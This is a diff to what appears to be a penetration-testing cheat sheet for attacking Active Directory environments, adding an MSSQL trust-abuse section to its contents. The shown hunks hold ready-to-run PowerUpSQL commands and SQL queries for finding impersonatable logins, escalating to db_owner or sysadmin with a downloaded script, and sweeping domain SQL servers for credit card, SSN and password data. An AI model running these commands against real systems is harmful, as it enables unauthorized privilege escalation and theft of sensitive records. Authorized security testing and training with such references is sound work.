@@ -30,6 +30,16 @@
     * [Image Change Privilege Escalation](#Image-change-Privilege-Escalation) 
 * [DNS Admins](#DNS-Admins)
 * [Trust abuse SQL](#Trust-abuse-SQL)
+  * [Locating and accessing SQL Servers](#Locating-and-accessing-SQL-Servers)
+  * [Initial foothold](#Initial-foothold)
+  * [Privilege Escalation to sysadmin](#Privilege-Escalation-to-sysadmin)
+   	* [SQL Server enumerate login](#SQL-Server-enumerate-login)
+   	* [Impersonation attack](#Impersonation-attack)
+   	* [Create Stored procedure as DB_Owner](#Create-Stored-procedure-as-DB_Owner)
+  * [Command execution](#Command-execution)
+  * [Database links](#Database-links)
+  * [Data exfiltration](#Data-exfiltration)
+  * [SQL Queries](#SQL-Queries)
 * [WSUS](#Attacking-WSUS)
 * [Cross Domain attacks](#Cross-Domain-attacks)
   * [Kerberoast](#Kerberoast)
@@ -1339,12 +1349,13 @@ Get-SQLFuzzDomainAccount -Instance <COMPUTERNAME>\<INSTANCENAME>
 ```
  
 ### Impersonation attack
-#### Check if impersonation is possible
+#### Check if impersonation is possible PowerUpSQL
+- Might be able to use the ```-exploit``` flag to exploit it
 ```
-Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit
+Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug
 ```
 
-#### Check if impersonation is possible
+#### Check if impersonation is possible manually
 ```
 -- Find users that can be impersonated
 SELECT distinct b.name
@@ -1354,7 +1365,14 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-#### Impersonate a user
+#### Impersonate a user script
+- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
+```
+Import-Module .\Invoke-SqlServerDbElevateDbOwner.psm1
+Invoke-SqlServerDbElevateDbOwner -SqlUser <USER> -SqlPass <PASSWORD> -SqlServerInstance <INSTANCE>
+```
+
+#### Impersonate a user manually
 - Might be possible to impersonate user a and then user b and then sa!
 ```
 -- Verify you are still running as the normal user login
@@ -1525,7 +1543,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Get-SQLColumnSampleDataT
 Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults | Where-Object {$_.is_encrypted -eq 'TRUE'}| Get-SQLColumnSampleDataThreaded -Verbose -Threads 20 -Keyword "credit,creditcard,ssn,bsn,password,wachtwoord" -SampleSize 2 -ValidateCC -NoDefaults
 ```
 
-### Some queries
+#### SQL Queries
 ```
 #When able to connect directy to the instance
 Get-SQLDatabase
@@ -1560,7 +1578,6 @@ SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
 ```
 SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
 ```
-
 
 ## Foreign Security Principals
 - A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).
